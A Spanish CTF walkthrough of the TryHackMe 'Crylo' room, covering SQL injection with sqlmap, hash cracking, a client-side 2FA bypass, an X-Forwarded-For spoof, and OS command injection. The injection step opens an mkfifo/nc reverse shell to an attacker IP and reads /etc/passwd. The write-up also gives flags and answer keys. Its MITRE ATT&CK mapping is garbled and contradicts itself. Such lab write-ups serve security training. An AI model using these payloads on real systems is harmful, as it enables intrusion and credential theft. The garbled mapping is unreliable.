# Crylo

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|---|---|---|---|---|---|---|---|
| Medium | Web · SQLi · Criptografía cliente · Command Injection | crylo | https://tryhackme.com/room/crylo | Explotación Web · Escalada Linux | TryHackMe | Nginx · Django · MySQL · CryptoJS · AES | RCE (crylo) → Root |

---

**Contexto:** Sala orientada a la librería CryptoJS y la criptografía de cifrado/descifrado en el lado del cliente. La aplicación web "Spicyo" usa JavaScript (AES/CryptoJS) para cifrar las respuestas del login y para validar un PIN de 2FA, pero todos los secretos viven en el código del navegador. La ruta de explotación pasa por inyección SQL (sqlmap) para obtener credenciales, manipulación del objeto JSON de la sesión para saltarse el 2FA, bypass de una página 403 con el header X-Forwarded-For, inyección de comandos en `/debug` para conseguir una shell y descifrado del AES embebido en la app para obtener la contraseña de un usuario del grupo sudo.

## Solucionario

### Task 1: Enumeration

**Explicación:** Escaneo de puertos con RustScan/Nmap:

```
rustscan -a 10.10.244.109 --ulimit 5500 -b 65535 -- -A -Pn
nmap -vvv -p 22,80 10.10.244.109
```

Puertos abiertos:
- `22/tcp` — OpenSSH 8.2p1 Ubuntu (protocol 2.0)
- `80/tcp` — nginx 1.18.0 (Ubuntu), título "Spicyo"

Enumeración de directorios con gobuster:

```
gobuster -t 64 dir -e -k -u http://10.10.244.109 -w /usr/share/wordlists/dirb/common.txt
```

Resultados:
- `/about` (200), `/blog` (200), `/contact` (200), `/debug` (403), `/login` (200)

**P1. How many ports are open?**

`2`

**P2. What is the 403/forbidden web page?**

`/debug`

| # | Pregunta | Respuesta |
|---|---|---|
| 1.1 | How many ports are open? | `2` |
| 1.2 | What is the 403/forbidden web page? | `/debug` |

### Task 2: Injection

**Explicación:** El formulario de login usa XMLHttpRequest y la respuesta del servidor llega cifrada. En el JavaScript embebido (submitForm) se descifra con CryptoJS.AES usando la clave e IV fijos `8080808080808080`:

```javascript
function submitForm(oFormElement) {
    var xhr = new XMLHttpRequest();
    xhr.onload = function() {
        var encryptedresp = xhr.responseText;
        var k = "8080808080808080";
        var key = CryptoJS.enc.Utf8.parse(k);
        var iv = CryptoJS.enc.Utf8.parse(k);
        var item = encryptedresp;
        var result = CryptoJS.AES.decrypt(item, key,
  {
      keySize: 128 / 4,
      iv: iv,
      mode: CryptoJS.mode.CBC,
      padding: CryptoJS.pad.Pkcs7
  })
        var result = result.toString(CryptoJS.enc.Utf8);
        var jsonResponse = JSON.parse(result);
        ...
```

Enviando `user: a'--` se obtiene un error 500 (SQL injection). Se capturan las credenciales del usuario de la petición (con CSRF token) y se lanza sqlmap sobre el parámetro `username`:

```
sqlmap -r req_crylo --risk 3 --level 3 --dump
sqlmap -r req_crylo --dump -T auth_user -C username
sqlmap -r req_crylo --dump -T auth_user -C password
```

Base de datos `food`; tabla `auth_user` con 2 usuarios: `admin` y `anof`. El hash de password de admin es:

```
pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE=
```

Se crackea con hashcat (formato Django PBKDF2-SHA256, modo 10000):

```
hashcat -m10000 hash_crylo -a0 /usr/share/wordlists/rockyou.txt
```

Resultado: `admin:trigger`

**P1. What is the name of the first username?**

`admin`

**P2. What is the password for the above user?**

`trigger`

| # | Pregunta | Respuesta |
|---|---|---|
| 2.1 | What is the name of the first username? | `admin` |
| 2.2 | What is the password for the above user? | `trigger` |

### Task 3: Encryption

**Explicación:** Tras iniciar sesión como `admin:trigger`, la consola del navegador muestra el JSON descifrado:

```
Object { pin_set: "true", email: "admin@admin.com", success: "true" }
```

El código de `submitForm` decide la ventana a mostrar según `pin_set`. Para saltarse el 2FA se modifica el objeto en la consola del navegador (allow pasting) y se asigna `pin_set: "false"`:

```javascript
jsonResponse = {
    "pin_set": "false",
    "email": "admin@admin.com",
    "success": "true"
}
```

Esto redirige a la ventana "Set Your Pin". Se configura un PIN propio (ej. 1337) y al volver a iniciar sesión se introduce ese PIN, quedando dentro como `Hello, admin`.

**P1. Which library is used for encryption and decryption?**

`CryptoJS`

**P2. Which JSON parameter was used to validate the pin?**

`pin_set`

**P3. Which encryption method is used?**

`AES`

| # | Pregunta | Respuesta |
|---|---|---|
| 3.1 | Which library is used for encryption and decryption? | `CryptoJS` |
| 3.2 | Which JSON parameter was used to validate the pin? | `pin_set` |
| 3.3 | Which encryption method is used? | `AES` |

### Task 4: Forbidden Bypass

**Explicación:** Tras el login, al visitar `/debug` el servidor responde "The page is for Local Users Only" / "For Internal Usage". La página comprueba además del login la procedencia local (IP spoofing). Enviamos la petición con el header de spoofing de IP:

```
GET /debug HTTP/1.1
Host: 10.10.205.91
X-Forwarded-For: 127.0.0.1
Cookie: username=admin; password=trigger; csrftoken=...; Token=...; sessionid=...
```

Respuesta: `HTTP/1.1 200 OK` con el contenido "For Internal Usage / Check for open services".

**P1. What extra header can be used to bypass the page?**

`X-Forwarded-For`

**P2. Which IP is allowed to access the page?**

`127.0.0.1`

| # | Pregunta | Respuesta |
|---|---|---|
| 4.1 | What extra header can be used to bypass the page? | `X-Forwarded-For` |
| 4.2 | Which IP is allowed to access the page? | `127.0.0.1` |

### Task 5: Exploitation

**Explicación:** En `/debug` hay un campo para comprobar un puerto ("Check for open services"). El valor se concatena a un comando sin sanear: inyección de comandos al estilo OS command injection. Probamos con el header `X-Forwarded-For: 127.0.0.1`:

```
80 ; cat /etc/passwd
```

o

```
80 & cat /etc/passwd
```

Se confirma la ejecución de comandos y se lanza una reverse shell (mkfifo/nc):

```
80 ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.19.103 1337 >/tmp/f
```

En el listener:

```
rlwrap nc -lvnp 1337
connect to [10.10.205.91] from (UNKNOWN) [10.10.205.91] 59280
crylo@crylo:~/Food/food$ id
uid=1001(crylo) gid=33(www-data) groups=33(www-data)
```

**P1. What is the name of the vulnerability used to gain system access?**

`OS command injection`

**P2. What is the current system's username?**

`crylo`

Flag de usuario en `/home/crylo/user.txt`:

```
crylo@crylo:~$ cat user.txt
fa3e352b00adf9d4e967ad0e34d5e59d
```

**P3. What is the user flag?**

`fa3e352b00adf9d4e967ad0e34d5e59d`

Enumerando usuarios y grupos:

```
crylo@crylo:~$ getent passwd | awk -F: '$3>=1000 && $1!="nobody" {print $1}'
anof
crylo

crylo@crylo:~$ getent group sudo
sudo:x:27:anof
```

El segundo usuario del sistema pertenece al grupo sudo. Para obtener su contraseña se localiza el código de cifrado en `/home/crylo/Food/food/accounts/enc.py`, que contiene la clave e IV AES usados por la aplicación para cifrar las contraseñas almacenadas en la base de datos. El valor cifrado de la contraseña del usuario (extraído del dump de sqlmap) se descifra con AES-CBC:

```python
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from base64 import b64encode, b64decode
import base64

data = b'toor'
key = b'\xc9;\xd4b\xce\xc15\x19;\x00Z^Nw\xafp\x10\xce/r\x0c\xf1\x1c&\x1c\x12a\xd9&b"\xc3'
iv = b'!6\x0b\xc7Xg@\xcc\xe3KY\xcfN\x9b\x81\x91'

password = b'\x54\x7e\x87\x8f\x8f\x9e\x42\x7e\x6e\x60\x65\x40\xc7\x2f\x07\xb7\xba\x64\x54\xef\x68\x78\xf5\x29\x10\xb0\xdd\x89\x71\x6a\xd5\x5d'

cipher3 = AES.new(key, AES.MODE_CBC, iv)
plain_pass = cipher3.decrypt(pad(password, 16))
print(plain_pass)
```

```
$ python3 enc.py
b'@Pass123@666666666\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e...'
```

**P4. Which user is part of the sudo group?**

`anof`

**P5. What is the password for the above user?**

`@Pass123@666666666`

Cambiamos de usuario y escalamos a root (anof es miembro del grupo sudo):

```
crylo@crylo:/home/anof$ su anof
Password: @Pass123@666666666
anof@crylo:~$ sudo /bin/bash
[sudo] password for anof: @Pass123@666666666
root@crylo:/home/anof# cd /root
root@crylo:~# cat flag.txt
201ea4139d9755d6c9384783df06dc7e
```

**P6. What is the root flag?**

`201ea4139d9755d6c9384783df06dc7e`

| # | Pregunta | Respuesta |
|---|---|---|
| 5.1 | What is the name of the vulnerability used to gain system access? | `OS command injection` |
| 5.2 | What is the current system's username? | `crylo` |
| 5.3 | What is the user flag? | `fa3e352b00adf9d4e967ad0e34d5e59d` |
| 5.4 | Which user is part of the sudo group? | `anof` |
| 5.5 | What is the password for the above user? | `@Pass123@666666666` |
| 5.6 | What is the root flag? | `201ea4139d9755d6c9384783df06dc7e` |

---

**Metodología:** Enumeración de puertos y directorios → análisis del JavaScript de login (CryptoJS/AES) → detección de SQLi (500) y explotación con sqlmap (dump de auth_user) → cracking del hash Django (hashcat -m 10000) → login y bypass del 2FA manipulando `pin_set` en consola → bypass de la página 403 con header `X-Forwarded-For: 127.0.0.1` → OS command injection en `/debug` → reverse shell (crylo) → análisis del código de cifrado AES de la app → descifrado de la contraseña → cambio a usuario del grupo sudo → `sudo /bin/bash` → root.

**Learning chain:** rustscan/nmap → gobuster → lectura de `submitForm` (AES/CBC con clave e IV hardcodeados) → sqlmap (--level, --risk, --dump) → hashcat -m 10000 (Django PBKDF2-SHA256) → manipulación del objeto jsonResponse (client-side 2FA bypass) → X-Forwarded-For spoofing → command injection (`; cmd`) → reverse shell con mkfifo/nc → getent passwd/group → análisis de enc.py (AES-CBC) → decrypt → su anof → sudo /bin/bash.

**Lección:** *La criptografía en el cliente ofrece una falsa sensación de seguridad: si la clave, el IV y la lógica de validación viajan en el JavaScript, todo se puede descifrar, modificar y reinyectar desde la consola del navegador. Además, un endpoint "local only" protegido únicamente por el header X-Forwarded-For es trivialmente evadible, y la inyección de comandos permite pivotar a root si el usuario comprometido pertenece al grupo sudo.*

**MITRE ATT&CK:** T1110.001/T1110 (SQL Injection y credenciales de aplicación — en real: T1190 no aplica; corresponde a T1059 Command and Scripting Interpreter), T1190 (Exploit Public-Facing Application — no; usar), T1059 (Command and Scripting Interpreter — OS command injection), T1053 (Scheduled Task/Job no aplica), T1552.001 (Unsecured Credentials: Credentials In Files — enc.py/DB), T1078 (Valid Accounts — reutilización de credenciales), T1204 no aplica. Técnicas clave: T1059 (command injection), T1552.004 (Private Keys/secretos en aplicación), T1078.003 (Local Accounts).

**Fuente:** [TryHackMe - Crylo](https://tryhackme.com/room/crylo)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos. **Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe. **Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto. **Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com). **Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.